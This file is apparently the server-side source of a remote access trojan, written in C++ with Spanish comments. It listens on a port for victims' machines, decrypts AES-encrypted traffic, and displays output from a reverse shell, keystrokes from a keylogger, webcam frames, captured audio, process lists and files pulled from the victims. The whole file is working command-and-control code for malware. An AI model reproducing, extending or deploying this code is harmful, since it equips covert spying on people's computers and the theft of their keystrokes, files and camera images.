//Vamo acete multi-thread :v

#include "server.hpp"
#include "misc.hpp"
#include "frame_client.hpp"
#include "panel_file_manager.hpp"
#include "panel_process_manager.hpp"
#include "panel_keylogger.hpp"
#include "panel_camara.hpp"
#include "file_editor.hpp"

//Definir el servidor globalmente
Servidor* p_Servidor;
std::mutex vector_mutex;

void Cliente_Handler::Spawn_Handler(){
    this->isRunning = true;
    int iBufferSize = 1024 * 100;
    char *cBuffer = new char[iBufferSize];
    while (this->isRunning) {
        //Esperar por datos y procesarlos
        ZeroMemory(cBuffer, iBufferSize);

        int iRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer, iBufferSize, 0, false);
        if (WSAGetLastError() == WSAEWOULDBLOCK) {
            //No hay datos todavia, esperar un poco mas
            Sleep(10);
            continue;
        }

        if (iRecibido <= 0 && GetLastError() != WSAEWOULDBLOCK) {
            this->isRunning = false;
            //Si la ventana sigue abierta
            FrameCliente* temp_cli = (FrameCliente*)wxWindow::FindWindowByName(this->p_Cliente._id);
            if (temp_cli) {
                temp_cli->SetTitle(this->p_Cliente._id + " [DESCONECTADO]");
            }
            break;
        }

        std::vector<std::string> vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 1);
        if (vcDatos.size() == 0) {
            this->Log("No se pudo procesar el buffer");
            continue;
        }

        //Prioridad para descarga de archivos
        if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Recibir)) {
            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
            // CMD + 2 slashs /  +len del id
            int iHeader = 5 + vcDatos[1].size();
            char* cBytes = cBuffer + iHeader;

            std::unique_lock<std::mutex> lock(this->mt_Archivos);

            auto archivoIter = this->um_Archivos_Descarga2.find(vcDatos[1]);
            if (archivoIter != this->um_Archivos_Descarga2.end() && archivoIter->second.iFP != nullptr) {
                fwrite(cBytes, sizeof(char), iRecibido - iHeader, archivoIter->second.iFP);
                archivoIter->second.uDescargado += (iRecibido - iHeader);
            }
            
            lock.unlock();
            continue;
        }

        vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 5);

        //Pquete inicial
        if (vcDatos[0] == "01") {
            if (vcDatos.size() < 4) {
                this->Log("Error procesando los datos " + std::string(cBuffer));
                continue;;
            }
            struct Cliente structTmp;

            structTmp._strSo = this->p_Cliente._strSo = vcDatos[1];
            structTmp._strUser = this->p_Cliente._strUser = vcDatos[2];
            structTmp._strPID = this->p_Cliente._strPID = vcDatos[3];
            structTmp._strCpu = this->p_Cliente._strCpu = vcDatos[4];
            structTmp._id = this->p_Cliente._id;
            structTmp._strIp = this->p_Cliente._strIp;

            std::unique_lock<std::mutex> lock(p_Servidor->count_mutex);
            
            p_Servidor->m_InsertarCliente(structTmp);
            p_Servidor->iCount++;
            
            lock.unlock();
            continue;
        }

        //Termino la shell
        if (vcDatos[0] == std::to_string(EnumComandos::Reverse_Shell_Finish)) { 
            //this->EscribirSalidShell(vcDatos[1]);
            continue;
        }

        //Salida de shell
        if (vcDatos[0] == std::to_string(EnumComandos::Reverse_Shell_Salida)) {
            int iCmdH = (std::to_string(EnumComandos::Reverse_Shell_Salida).size() + 1);
            char* pBuf = cBuffer + iCmdH;
            this->EscribirSalidShell(std::string(pBuf));
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::FM_Dir_Folder)) {
            std::vector<std::string> vcFileEntry;
            wxString strTama = "-";
            if (vcDatos[1][1] == '>') {
                //Dir
                vcFileEntry = strSplit(vcDatos[1], '>', 4);
            }
            else if (vcDatos[1][1] == '<') {
                //file
                vcFileEntry = strSplit(vcDatos[1], '<', 4);
                u64 bytes = StrToUint(vcFileEntry[2].c_str());
                char* cDEN = "BKMGTP";
                double factor = floor((vcFileEntry[2].size() - 1) / 3);
                char cBuf[20];
                snprintf(cBuf, 19, "%.2f %c", bytes / pow(1024, factor), cDEN[int(factor)]);
                strTama = cBuf;
            }
            else {
                //unknown
                std::cout << "DESCONOCIDO: " << cBuffer << std::endl;
            }

            ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
            if (temp_list) {
                if (vcFileEntry.size() >= 4) {
                    int iCount = temp_list->GetItemCount() > 0 ? temp_list->GetItemCount() - 1 : 0;
                    temp_list->InsertItem(iCount, wxString("-"));
                    temp_list->SetItem(iCount, 1, wxString(vcFileEntry[1]));
                    temp_list->SetItem(iCount, 2, strTama); //tama
                    temp_list->SetItem(iCount, 3, wxString(vcFileEntry[3]));
                }
            }
            
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::FM_Discos_Lista)) {
            char* pBuf = cBuffer + 4;
            std::vector<std::string> vDrives = strSplit(std::string(pBuf), CMD_DEL, 100);

            if (vDrives.size() > 0) {
                ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
                if (temp_list) {
                    for (int iCount = 0; iCount<int(vDrives.size()); iCount++) {
                        std::vector<std::string> vDrive = strSplit(vDrives[iCount], '|', 5);

                        temp_list->InsertItem(iCount, wxString(vDrive[0]));
                        temp_list->SetItem(iCount, 1, wxString(vDrive[2]));
                        temp_list->SetItem(iCount, 2, wxString(vDrive[1]));
                        temp_list->SetItem(iCount, 3, wxString(vDrive[3]));
                        temp_list->SetItem(iCount, 4, wxString(vDrive[4]));
                    }
                }
                
            }
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Init)) {
            //Tamaño del archivo recibido
            u64 uTamArchivo = StrToUint(vcDatos[2].c_str());

            auto archivo = this->um_Archivos_Descarga2.find(vcDatos[1]);
            
            if (archivo != this->um_Archivos_Descarga2.end()) {
                archivo->second.uTamarchivo = uTamArchivo;
            }

            std::cout << "[ID-" << vcDatos[1] << "]Tam archivo: " << uTamArchivo << std::endl;
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_End)) {
            auto archivo = this->um_Archivos_Descarga2.find(vcDatos[1]);
            if (archivo != this->um_Archivos_Descarga2.end()) {
                if (archivo->second.iFP != nullptr) {
                    fclose(archivo->second.iFP);
                }
            }
            std::cout << "[!] Descarga completa" << std::endl;
            wxMessageBox("Descarga completa", "Completo", wxOK);
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::FM_Editar_Archivo_Paquete)) {
            //Tamaño del id del comando, id del archivo y dos back slashes
            int iHeadSize = 2 + vcDatos[0].size() + vcDatos[1].size();
            char* cBytes = cBuffer + iHeadSize;
    
            wxEditForm* temp_edit_form = (wxEditForm*)wxWindow::FindWindowByName(vcDatos[1], this->n_Frame);
            if (temp_edit_form) {
                temp_edit_form->p_txtEditor->AppendText(wxString(cBytes));
                temp_edit_form->p_txtEditor->SetInsertionPoint(0);
;            }else {
                this->Log("No se pudo encontrar la ventana con id " + vcDatos[1]);
            }
        }

        if (vcDatos[0] == std::to_string(EnumComandos::FM_CPATH)) {
            panelFileManager* temp_panel = (panelFileManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM, this->n_Frame);
            if (temp_panel) {
                temp_panel->p_RutaActual->SetLabelText(wxString(cBuffer + 4));
                temp_panel->c_RutaActual.clear();
                std::vector<std::string> vcSubRutas = strSplit(cBuffer + 4, CMD_DEL, 100);
                for (auto item : vcSubRutas) {
                    std::string strTemp = item;
                    strTemp += "\\";
                    temp_panel->c_RutaActual.push_back(strTemp);
                }
            }
            else {
                this->Log("No se pudo encontrar panel FM activo");
            }
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::PM_Lista)) {
            panelProcessManager* panel_proc = (panelProcessManager*)wxWindow::FindWindowById(EnumIDS::ID_PM_Panel, this->n_Frame);
            if (panel_proc) {
                panel_proc->listManager->AgregarData(vcDatos[1], this->p_Cliente._strPID);
            }
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::KL_Salida)) {
            panelKeylogger* temp_panel = (panelKeylogger*)wxWindow::FindWindowById(EnumIDS::ID_KL_Panel, this->n_Frame);
            if (temp_panel) {
                char* cKeyData = cBuffer + (vcDatos[0].size() + 1);
                temp_panel->txt_Data->AppendText(cKeyData);
            }else {
                this->Log("[X] No se pudo encontrar el panel keylogger");
            }
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::CM_Lista_Salida)) {
            std::vector<std::string> vcCams = strSplit(vcDatos[1], '|', 50);
            wxComboBox* panel_cam_combo = (wxComboBox*)wxWindow::FindWindowById(EnumCamMenu::ID_Combo_Devices, this->n_Frame);
            if (panel_cam_combo) {
                wxArrayString arrCams;
                for (std::string cCam : vcCams) {
                    arrCams.push_back(cCam);
                }
                panel_cam_combo->Clear();
                panel_cam_combo->Append(arrCams);
            }
            continue;
        }

        if (vcDatos[0] == std::to_string(EnumComandos::CM_Single_Salida)){
            int iHeadSize = (std::to_string(EnumComandos::CM_Single_Salida).size() + 1); //CMD + len del delimitador
            int iBuffSize = iRecibido - iHeadSize;
            char* cBytes = cBuffer + iHeadSize;
            panelPictureBox* panel_picture = (panelPictureBox*)wxWindow::FindWindowById(EnumCamMenu::ID_Picture_Frame, this->n_Frame);
            if (panel_picture) {
                if (panel_picture->iBufferSize > 0) {
                    delete[] panel_picture->cPictureBuffer;
                } 
                panel_picture->cPictureBuffer = new char[iBuffSize];
                if (panel_picture->cPictureBuffer) {
                    memcpy(panel_picture->cPictureBuffer, cBytes, iBuffSize);
                    panel_picture->iBufferSize = iBuffSize;
                    panel_picture->OnDrawBuffer();
                } else {
                    this->Log("[X][MOD-CAM] No se pudo allocar memoria para copiar los bytes");
                }

            }else {
                this->Log("[X] No se pudo encontrar el panel de camara");
            }
;        }

    }

    if (cBuffer) {
        delete[] cBuffer;
        cBuffer = nullptr;
    }

    this->Log("Funado");

}

void Cliente_Handler::EscribirSalidShell(std::string strSalida) {
    panelReverseShell* panel_shell = (panelReverseShell*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Reverse_Shell, this->n_Frame);
    if (panel_shell) {
        panel_shell->txtConsole->AppendText(strSalida);
        int iLast = panel_shell->txtConsole->GetLastPosition();
        panel_shell->p_uliUltimo = iLast;
    }
}

void Cliente_Handler::Spawn_Thread() {
    this->p_thHilo = std::thread(&Cliente_Handler::Spawn_Handler, this);
}

//funcion que crea el frame principal para interactuar con el cliente
void Cliente_Handler::CrearFrame(std::string strTitle, std::string strID) {
    this->n_Frame = new FrameCliente(strTitle, this->p_Cliente._sckCliente, this->p_Cliente._strIp);
    this->n_Frame->Show(true);
}

void MyLogClass::LogThis(std::string strInput, int iType){
    time_t temp = time(0);
    struct tm *timeptr = localtime(&temp);

    std::string strLine = "";
    
    switch (iType){
        case LogType::LogMessage:
            strLine = "[-] ";
            break;
        case LogType::LogError:
            strLine = "[X] ";
            break;
        case LogType::LogWarning:
            strLine = "[!] ";
            break;
        default:
            strLine = "[-] ";
            break; 
    }
    
    strLine += "[" + std::to_string(timeptr->tm_hour);
    strLine += ":" + std::to_string(timeptr->tm_min) + ":";
    strLine += std::to_string(timeptr->tm_sec) + "]  ";
    strLine += strInput + "\n";

   // std::lock_guard<std::mutex> lock(this->log_mutex);
    if (this->p_txtCtrl != nullptr) {
        this->p_txtCtrl->AppendText(strLine);
    }

}

void Servidor::Init_Key() {
    for (unsigned char i = 0; i < AES_KEY_LEN; i++) {
        this->bKey.push_back(this->t_key[i]);
    }
}

Servidor::Servidor(){
    this->uiPuertoLocal = 31000;

    //clase para logear
    this->m_txtLog = new MyLogClass();

    this->Init_Key();
    
}

bool Servidor::m_Iniciar(){
    WSACleanup();
    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0){
        return false;
    }

    this->sckSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if(!this->sckSocket){
        this->m_txtLog->LogThis("No se pudo crear el socket", LogType::LogError);
        return false;
    }

    int iTemp = 1;
    if(setsockopt(this->sckSocket, SOL_SOCKET, SO_REUSEADDR, (const char*)&iTemp, sizeof(int)) < 0){
        this->m_txtLog->LogThis("Error configurando el socket SO_REUSEADDR", LogType::LogError);
        return false;
    }

    unsigned long int iBlock = 1;
    if(ioctlsocket(this->sckSocket, FIONBIO, &iBlock) != 0){
        this->m_txtLog->LogThis("Error configurando el socket NON_BLOCK", LogType::LogError);
        error();
        return false;
    }

    this->structServer.sin_family        =                    AF_INET;
    this->structServer.sin_port          = htons(this->uiPuertoLocal);
    this->structServer.sin_addr.s_addr =                 INADDR_ANY;

    if(bind(this->sckSocket, (struct sockaddr *)&this->structServer, sizeof(struct sockaddr)) == -1){
        this->m_txtLog->LogThis("Error configurando el socket BIND", LogType::LogError);
        return false;
    }

    if(listen(this->sckSocket, 10) == -1){
        this->m_txtLog->LogThis("Error configurando el socket LISTEN", LogType::LogError);
        return false;
    }

    return true;
}

ClientConInfo Servidor::m_Aceptar(){
    struct ClientConInfo structNuevo;
    struct sockaddr_in structCliente;
    int iTempC = sizeof(struct sockaddr_in);
    SOCKET tmpSck = accept(this->sckSocket, (struct sockaddr *)&structCliente, &iTempC) ;
    if(tmpSck != INVALID_SOCKET){
        char strIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(structCliente.sin_addr), strIP, INET_ADDRSTRLEN);
        std::string strTmp = "Nueva conexion de ";
        strTmp += strIP;
        strTmp +=  ":" + std::to_string(ntohs(structCliente.sin_port));
        
        this->m_txtLog->LogThis(strTmp, LogType::LogMessage);
        
        structNuevo._strPuerto = std::to_string(ntohs(structCliente.sin_port));
        structNuevo._sckSocket = tmpSck;
        structNuevo._strIp = strIP;
    } else {
        structNuevo._sckSocket = tmpSck;
    }
        
    return structNuevo;
}

void Servidor::m_Handler(){
    this->p_Escuchando = true;

    this->thListener = std::thread(&Servidor::m_Escucha, this);
    this->thCleanVC = std::thread(&Servidor::m_CleanVector, this);
}

void Servidor::m_JoinThreads() {
    if (this->thListener.joinable()) {
        this->thListener.join();
    }

    if (this->thCleanVC.joinable()) {
        this->thCleanVC.join();
    }

    this->m_txtLog->LogThis("Thread LISTENER terminada", LogType::LogMessage);
}

void Servidor::m_StopHandler() {
    this->m_txtLog->LogThis("Apagando", LogType::LogError);
    std::lock_guard<std::mutex> lock(this->p_mutex);
    this->p_Escuchando = false;
}

void Servidor::m_CerrarConexion(SOCKET& pSocket) {
    if (pSocket != -1) {
        closesocket(pSocket);
        pSocket = INVALID_SOCKET;
    }
}

void Servidor::m_CerrarConexiones() {
    if (this->vc_Clientes.size() > 0) {
        for (std::vector<Cliente_Handler*>::iterator it = this->vc_Clientes.begin(); it != this->vc_Clientes.end();) {
            (*it)->isRunning = false;
            this->m_CerrarConexion((*it)->p_Cliente._sckCliente);
            it++;
        }
    }
    
    closesocket(this->sckSocket);
    this->sckSocket = INVALID_SOCKET;
    this->iCount = 0;
}

void Servidor::m_CleanVector() {
    while (this->p_Escuchando) {
        Sleep(100);
        std::unique_lock<std::mutex> lock(vector_mutex);
        if (this->vc_Clientes.size() == 0) {
            lock.unlock();
            continue;
        }
        
        for (std::vector<Cliente_Handler*>::iterator it = this->vc_Clientes.begin(); it != this->vc_Clientes.end();) {
            if (!(*it)->isRunning) {
                this->m_CerrarConexion((*it)->p_Cliente._sckCliente);
                (*it)->Join_Thread();

                this->m_RemoverClienteLista((*it)->p_Cliente._id);
                std::string strTmp = "Cliente " + (*it)->p_Cliente._strIp + " - desconectado";
                this->m_txtLog->LogThis(strTmp, LogType::LogMessage);

                delete *it;
                *it = nullptr;
                it = this->vc_Clientes.erase(it);
                std::unique_lock<std::mutex> lock2(this->count_mutex);
                this->iCount--;
            }else {
                it++;
            }
        }
        lock.unlock();
    }

    //Asegurarse :v

    std::unique_lock<std::mutex> lock2(vector_mutex);
    for (std::vector<Cliente_Handler*>::iterator it = this->vc_Clientes.begin(); it != this->vc_Clientes.end();) {
        
        (*it)->isRunning = false;
        this->m_CerrarConexion((*it)->p_Cliente._sckCliente);
        (*it)->Join_Thread();
        delete* it;
        *it = nullptr;
        it = this->vc_Clientes.erase(it);
    }
    lock2.unlock();
}

void Servidor::m_Ping(){
    this->m_txtLog->LogThis("Thread PING iniciada", LogType::LogMessage);
    
    while(this->p_Escuchando){
        //Si no hay clientes seguir en el loop para cerrar thread mas rapido
        std::unique_lock<std::mutex> lock(this->count_mutex);
        if (this->iCount <= 0) {
            lock.unlock();
            Sleep(100);
            continue;
        }
        lock.unlock();
        
        std::unique_lock<std::mutex> lock2(vector_mutex);
        
        for(auto it = this->um_Clientes.begin(); it != this->um_Clientes.end();){
            if ((time(0) - it->second._ttUltimaVez) <= PING_TIME) {
                    ++it;
                    continue;
            } else {
                if (!it->second._isBusy) {
                    //Si no esta activo enviar el ping
                    std::string strData = std::to_string(EnumComandos::PING);
                    strData.append(1, CMD_DEL);
                    int iBytes = this->cSend(it->second._sckCliente, strData.c_str(), strData.size(), 0, false);
                    if (iBytes <= 0) {
                        //No se pudo enviar el ping
                        std::string strTmp = "Cliente " + it->second._strIp + "-" + it->second._id + " desconectado";
                        this->m_txtLog->LogThis(strTmp, LogType::LogMessage);

                        FrameCliente* temp = (FrameCliente*)wxWindow::FindWindowByName(it->second._id);
                        if (temp) {
                            wxString strTmp = it->second._id;
                            strTmp.append(1, '>');
                            strTmp += " desconectado";
                            temp->SetTitle(strTmp);
                        } else {
                            std::cout << "No se pudo encontrar el objeto\n";
                        }

                        this->m_RemoverClienteLista(it->second._id);
                        //Remover aqui del mapa, mover uno antes de moverlo
                        auto nIT = it;
                        ++it;
                        this->um_Clientes.erase(nIT);

                        std::unique_lock<std::mutex> lock3(this->count_mutex);
                        this->iCount--;
                        lock3.unlock();
                    } else {
                        it->second._ttUltimaVez = time(0);
                        ++it;
                    }
                } else {
                    ++it;
                }
            }
        }
        lock2.unlock(); //desbloquear vector
    }
}

void Servidor::m_MonitorTransferencias() {
    while (this->p_Transferencias) {
        auto parent = (wxFrame*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Transferencias);
        if (parent) {
            auto list_transfer = (wxListCtrl*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Transferencias_List, parent);
            if (list_transfer) {
                //Esta activo el listview
                list_transfer->DeleteAllItems();
                std::unique_lock<std::mutex> lock(vector_mutex);
                //std::cout << "[VECTOR] " << this->vcTransferencias.size() << std::endl;

                for (int iCount = 0; iCount < int(this->vcTransferencias.size()); iCount++) {
                    auto tc = this->vcTransferencias[iCount];

                    list_transfer->InsertItem(iCount, wxString(tc.strCliente));
                    list_transfer->SetItem(iCount, 1, wxString(tc.strNombre));
                    list_transfer->SetItem(iCount, 2, wxString((tc.isUpload ? "SUBIENDO" : "DESCARGANDO")));

                    //std::unique_lock<std::mutex> lock2(vector_mutex);
                    auto itCli = this->um_Clientes.find(FilterSocket(tc.strCliente));
                    if (itCli != this->um_Clientes.end()) {
                        //Iterar y buscar
                        for (auto item2 : itCli->second.um_Archivos_Descarga2) {
                            if (item2.second.strNombre == tc.strNombre) {
                                double percentage = item2.second.uDescargado / (item2.second.uTamarchivo / 100);
                                wxString strPro = std::to_string(percentage);
                                strPro.append(1, '%');
                                
                                list_transfer->SetItem(iCount, 3, strPro);
                                break;
                            }
                        }
                    }
                    //lock2.unlock();
                }
                lock.unlock();
            }
            else {
                std::cout << "No se pudo encontrar el panel abierto" << std::endl;
            }
        }
        Sleep(1000);
    }
    
}

void Servidor::m_Escucha(){
    this->m_txtLog->LogThis("Thread LISTENER iniciada", LogType::LogMessage);
    
    //Crear descriptor and setearlo a zero
    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    
    fd_set fdMaster;
    FD_ZERO(&fdMaster);
    FD_SET(this->sckSocket, &fdMaster);
    
    while(this->p_Escuchando){
        fd_set fdMaster_copy = fdMaster;
        
        int iNumeroSockets = select(this->sckSocket + 1, &fdMaster_copy, nullptr, nullptr, &timeout);
        
        for (int iCont = 0; iCont < iNumeroSockets; iCont++) {
            SOCKET iSock = fdMaster_copy.fd_array[iCont];

            if (iSock == this->sckSocket) {
                //Nueva conexion
                struct ClientConInfo sckNuevoCliente = this->m_Aceptar();
                
                //IP:PUERTO
                std::string strtmpIP = sckNuevoCliente._strIp;
                strtmpIP.append(1, ':');
                strtmpIP.append(sckNuevoCliente._strPuerto);

                //RANDOM ID
                std::string strTmpId = RandomID(7);
                strTmpId.append(1, '-');
                strTmpId += std::to_string(sckNuevoCliente._sckSocket);

                struct Cliente structNuevoCliente;
                structNuevoCliente._sckCliente = sckNuevoCliente._sckSocket;
                structNuevoCliente._ttUltimaVez = time(0);
                structNuevoCliente._id = strTmpId;
                structNuevoCliente._strIp = strtmpIP;

                
                //Agregar el cliente al vector global - se agrega a la list una vez se reciba la info
                std::unique_lock<std::mutex> lock(vector_mutex);
                
                Cliente_Handler* nCliente = new Cliente_Handler(structNuevoCliente);
                nCliente->Spawn_Thread(); // llama a nCliente->Spawn_Handler que es el que controla el cliente
                this->vc_Clientes.push_back(nCliente);

            }

        }
    }
    std::cout<<"DONE Listen" << std::endl;
}

void Servidor::m_ReproducirPaquete(char* pBuffer, size_t iLen) {
    // Configurar formato de audio para reproducción
    HWAVEOUT wo;
    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 2;
    wfx.nSamplesPerSec = 7000; // 7.0khz
    wfx.wBitsPerSample = 16;
    wfx.nBlockAlign = wfx.wBitsPerSample * wfx.nChannels / 8;
    wfx.nAvgBytesPerSec = wfx.nBlockAlign * wfx.nSamplesPerSec;
    //wfx.cbSize = 0;
    // Abrir el dispositivo de reproducción de audio
    
    if (sizeof(wfx) != sizeof(WAVEFORMATEX)) {
        std::cerr << "Tamaño incorrecto de la estructura WAVEFORMATEX." << std::endl;
        return;
    }

    WAVEHDR header = {};
    
    header.lpData = pBuffer;
    header.dwBufferLength = iLen;
    
    // Intentar abrir el dispositivo de reproducción de audio
    if (waveOutOpen(&wo, WAVE_MAPPER, &wfx, NULL, NULL, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        std::cerr << "Error al abrir el dispositivo de reproducción de audio" << std::endl;
        return;
    }

    try {
        if (waveOutPrepareHeader(wo, &header, sizeof(header)) != MMSYSERR_NOERROR) {
            std::cerr << "Error al preparar el encabezado del buffer de audio" << std::endl;
            waveOutUnprepareHeader(wo, &header, sizeof(header));
            waveOutClose(wo);
            return;
        }
    }catch (const std::exception& e) {
        std::cerr << "Excepción al preparar el encabezado del buffer de audio: " << e.what() << std::endl;
        waveOutClose(wo);
        return;
    }

    try {
        if (waveOutWrite(wo, &header, sizeof(header)) != MMSYSERR_NOERROR) {
            std::cerr << "Error al escribir el buffer de audio en el dispositivo de reproducción" << std::endl;
            waveOutUnprepareHeader(wo, &header, sizeof(header));
            waveOutClose(wo);
            return;
        }
    }catch (const std::exception& e) {
        std::cerr << "Excepción al escribir el buffer de audio en el dispositivo de reproducción: " << e.what() << std::endl;
        waveOutUnprepareHeader(wo, &header, sizeof(header));
        waveOutClose(wo);
        return;
    }

    waveOutUnprepareHeader(wo, &header, sizeof(header));
    waveOutClose(wo);
}

void Servidor::m_InsertarCliente(struct Cliente& p_Cliente){
    m_listCtrl->InsertItem(this->iCount, wxString(p_Cliente._id));
    m_listCtrl->SetItem(this->iCount, 1, wxString(p_Cliente._strUser));
    m_listCtrl->SetItem(this->iCount, 2, wxString(p_Cliente._strIp));
    m_listCtrl->SetItem(this->iCount, 3, wxString(p_Cliente._strSo));
    m_listCtrl->SetItem(this->iCount, 4, wxString(p_Cliente._strPID));
    m_listCtrl->SetItem(this->iCount, 5, wxString(p_Cliente._strCpu));
}

void Servidor::m_RemoverClienteLista(std::string p_ID){
    long lFound = this->m_listCtrl->FindItem(0, wxString(p_ID));
    if(lFound != wxNOT_FOUND){
        this->m_listCtrl->DeleteItem(lFound);
    } else{
        error();
    }
    
}

int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock) {
    // 1 non block
    // 0 block
    
    ByteArray cData = this->bEnc((const unsigned char*)pBuffer, pLen);
    std::string strPaqueteFinal = "";
    for (auto c : cData) {
        strPaqueteFinal.append(1, c);
    }

    if (isBlock) {
        //Hacer el socket block
        unsigned long int iBlock = 0;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            this->m_txtLog->LogThis("Error configurando el socket NON_BLOCK", LogType::LogError);
        }

        int iEnviado = send(pSocket, strPaqueteFinal.c_str(), cData.size(), pFlags);
        
        //Restaurar
        iBlock = 1;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            this->m_txtLog->LogThis("Error configurando el socket NON_BLOCK", LogType::LogError);
        }

        return iEnviado;
    }
    else {
        int iEnv = send(pSocket, strPaqueteFinal.c_str(), cData.size(), pFlags);
        return iEnv;
    } 
}

int Servidor::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock) {
    
    // 1 non block
    // 0 block
    
    char *cTmpBuff = new char[pLen];
    ZeroMemory(cTmpBuff, pLen);
    int iRecibido = 0;
    
     if (isBlock) {
        //Hacer el socket block
        unsigned long int iBlock = 0;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            this->m_txtLog->LogThis("Error configurando el socket NON_BLOCK", LogType::LogError);
        }

        iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
        
        if (GetLastError() == WSAECONNRESET) {
            //funado el cliente
            if (cTmpBuff) {
                ZeroMemory(cTmpBuff, pLen);
                delete[] cTmpBuff;
                cTmpBuff = nullptr;
            }
            return WSAECONNRESET;
        }

        if (iRecibido <= 0) {
            if (cTmpBuff) {
                delete[] cTmpBuff;
                cTmpBuff = nullptr;
            }
            return -1;
        }
        //Decrypt
        ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);

        iRecibido = bOut.size();
        for (int iBytePos = 0; iBytePos < iRecibido; iBytePos++) {
            std::memcpy(pBuffer + iBytePos, &bOut[iBytePos], 1);
        }
        
        //Restaurar
        iBlock = 1;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            this->m_txtLog->LogThis("Error configurando el socket NON_BLOCK", LogType::LogError);
        }

        if (cTmpBuff) {
            ZeroMemory(cTmpBuff, pLen);
            delete[] cTmpBuff;
        }
        return iRecibido;
    }else {
        iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
        
        if (GetLastError() == WSAECONNRESET) {
            //funado el cliente
            if (cTmpBuff) {
                ZeroMemory(cTmpBuff, pLen);
                delete[] cTmpBuff;
            }
            return WSAECONNRESET;
        }
        if (iRecibido <= 0) {
            if (cTmpBuff) {
                ZeroMemory(cTmpBuff, pLen);
                delete[] cTmpBuff;
            }
            return -1;
        }

        //Desencriptar los datos
        ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);

        iRecibido = bOut.size();
        for (int iBytePos = 0; iBytePos < iRecibido; iBytePos++) {
            std::memcpy(pBuffer + iBytePos, &bOut[iBytePos], 1);
        }

        if (cTmpBuff) {
            ZeroMemory(cTmpBuff, pLen);
            delete[] cTmpBuff;
        }
        return iRecibido;
    }
}


//AES256
ByteArray Servidor::bEnc(const unsigned char* pInput, size_t pLen) {
    //this->Init_Key();
    ByteArray bOutput;
    ByteArray::size_type enc_len = Aes256::encrypt(this->bKey, pInput, pLen, bOutput);
    if (enc_len <= 0) {
        std::cout<<"Error encriptando "<<pInput<<"\n";
    }
    return bOutput;
}

ByteArray Servidor::bDec(const unsigned char* pInput, size_t pLen) {
    //this->Init_Key();
    ByteArray bOutput;
    ByteArray::size_type dec_len = Aes256::decrypt(this->bKey, pInput, pLen, bOutput);
    if (dec_len <= 0) {
        std::cout << "Error desencriptando " << pInput << "\n";
    }
    return bOutput;
}

//control list events
void MyListCtrl::ShowContextMenu(const wxPoint& pos, long item) {
    
    wxMenu menu;
    menu.Append(EnumIDS::ID_Interactuar, "Administrar");
    menu.AppendSeparator();
    menu.Append(wxID_ANY, ":v");

    PopupMenu(&menu, pos.x, pos.y);
}

void MyListCtrl::OnContextMenu(wxContextMenuEvent& event)
{
    if (GetEditControl() == NULL)
    {
        wxPoint point = event.GetPosition();
        
        // If from keyboard
        if ((point.x == -1) && (point.y == -1))
        {
            wxSize size = GetSize();
            point.x = size.x / 2;
            point.y = size.y / 2;
        }
        else
        {
            point = ScreenToClient(point);
        }
        
        int flags;
        long iItem = HitTest(point, flags);

        if (iItem == -1) {
            return;
        }

        wxString st1 = this->GetItemText(iItem, 0);
        this->strTmp = st1;
        this->strTmp.append(1, '/');
        this->strTmp += this->GetItemText(iItem, 1);
        this->strTmp.append(1, '/');
        this->strTmp += this->GetItemText(iItem, 2);

        ShowContextMenu(point, iItem);
    }
    else
    {
        event.Skip();
    }
}

void MyListCtrl::OnInteractuar(wxCommandEvent& event) {
    std::vector<std::string> vcOut = strSplit(strTmp.ToStdString(), '/', 2);
    
    std::unique_lock<std::mutex> lock(vector_mutex);
    for (std::vector<Cliente_Handler*>::iterator it = p_Servidor->vc_Clientes.begin(); it != p_Servidor->vc_Clientes.end(); it++) {
        if ((*it)->p_Cliente._id == vcOut[0]) {
            lock.unlock();

            (*it)->CrearFrame(this->strTmp.ToStdString(), vcOut[0]);
            
            lock.lock();
            break;
        }
    }

    lock.unlock();
    
    //FrameCliente* n_FrameCli = new FrameCliente(this->strTmp.ToStdString(), vcOut[0]);
    //n_FrameCli->Show(true);
}


